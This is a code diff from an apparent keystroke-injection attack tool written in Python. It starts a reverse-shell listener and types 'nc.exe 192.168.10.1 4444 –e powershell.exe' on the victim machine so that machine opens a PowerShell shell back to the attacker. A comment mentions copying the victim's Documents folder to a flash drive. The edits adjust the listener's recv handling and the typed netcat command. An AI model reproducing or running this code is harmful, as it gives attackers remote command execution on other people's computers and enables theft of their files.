@@ -23,7 +23,6 @@ def reverse_shell_listener():
 		s.listen(10) # Listen for only 10 unaccepted connections.
 		conn, addr = s.accept() # Accept connections.
 		print("[+] Connected by", addr) # Print connected by ipaddress.
-		data = conn.recv(1024).decode("UTF-8") # Receive initial connection.
 		conn.send(bytes(shellcode, "UTF-8")) # Send shell command.
 		data = conn.recv(1024).decode("UTF-8") # Receive output from command.
 		print(data) # Print the output of the command.
@@ -56,7 +55,7 @@ def payload():
 
 	shelllistener=Process(target=reverse_shell_listener)
 	shelllistener.start()
-	eco.type("nc.exe 192.168.10.1 4444 –e powershell.exe")
+	eco.type(".\nc.exe 192.168.10.1 4444 –e powershell.exe")
 	shelllistener.join()
 	# Copy Documents Directory to Flash Drive
 	httpd.shutdown()
